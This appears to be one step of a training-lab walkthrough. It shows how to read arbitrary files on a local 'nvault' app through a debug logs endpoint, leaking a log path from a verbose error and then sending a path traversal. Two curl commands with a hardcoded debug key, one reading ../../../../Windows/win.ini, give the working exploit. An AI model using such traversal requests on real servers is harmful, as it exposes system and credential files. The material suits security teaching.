## 03 - Local file read via debug logs

### Goal
Read arbitrary server files using the debug logs endpoint.

### Endpoint
- `GET http://127.0.0.1:4000/__debug/logs?file=...`

### Steps
1. Call `/__debug/logs` without `file` to observe a verbose error that discloses an internal log path.
2. Call `/__debug/logs` again with a traversal path.

### Examples

```bash
curl -s -H "X-Debug-Key: nvault_debug_2024_internal" "http://127.0.0.1:4000/__debug/logs"
```

Windows example:

```bash
curl -s -H "X-Debug-Key: nvault_debug_2024_internal" "http://127.0.0.1:4000/__debug/logs?file=../../../../Windows/win.ini"
```

